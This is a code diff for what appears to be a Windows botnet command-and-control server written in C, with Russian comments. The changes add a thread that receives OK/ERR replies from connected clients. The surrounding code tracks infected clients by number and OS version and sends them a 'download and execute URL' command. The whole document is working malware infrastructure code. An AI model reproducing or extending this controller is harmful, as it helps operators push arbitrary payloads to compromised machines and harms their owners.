@@ -91,6 +91,37 @@ DWORD WINAPI isOnline(LPVOID param)
 
 DWORD WINAPI RecvThread(LPVOID param)
 {
+	SOCKET clientSock = ((SOCKET *)param)[0];
+	while (TRUE)
+	{
+		CMDiDATA indata; //создаем структуру отвечающую за протокол
+		if (sizeof(CMDiDATA) == recv(clientSock, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от клиента
+		{
+			switch (indata.CMD)
+			{
+				case CMD_OTVET_OK:
+				{
+					printf("otvet clienta - OK!\n");
+					break;
+				}
+				case CMD_OTVET_ER:
+				{
+					printf("otvet clienta - ERR!\n");
+					break;
+				}
+				default:
+					break;
+			}
+		}
+		else {
+			if (10054 == GetLastError())
+			{
+				closesocket(clientSock);
+				return 0;
+			}
+			Sleep(1000);
+		}
+	}
 	return 0;
 }
 
@@ -177,7 +208,7 @@ DWORD WINAPI ConsoleReader(LPVOID param)
 						}
 						if (url[0] != 0) //если первый символ массива чаров url не равен нулю
 						{
-							printf("\n\t zagruzka u vupolnenie url: %s...; NOMER: %d", url, NOMER);
+							printf("\n\t zagruzka u vupolnenie url: %s...; NOMER: %d\n", url, NOMER);
 							CMDiDATA indata; //создаем структуру отвечающую за протокол
 							DLE dlecmd; //инициализируем структуру которая будет отвечать за хранение URL
 							//по сути мы могли бы просто скопировать урл в indata.DATA, но я тут конечно
@@ -295,6 +326,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 								memcpy(SOCKETS[NOMER].OSVER, client.OSVER, sizeof(client.OSVER));
 								//тут может быть сигнал о том что клиент теперь онлайн
 								count_clients++;
+								CreateThread(0, NULL, RecvThread, (LPVOID)&newConn, 0, 0);
 							}
 							else
 							{
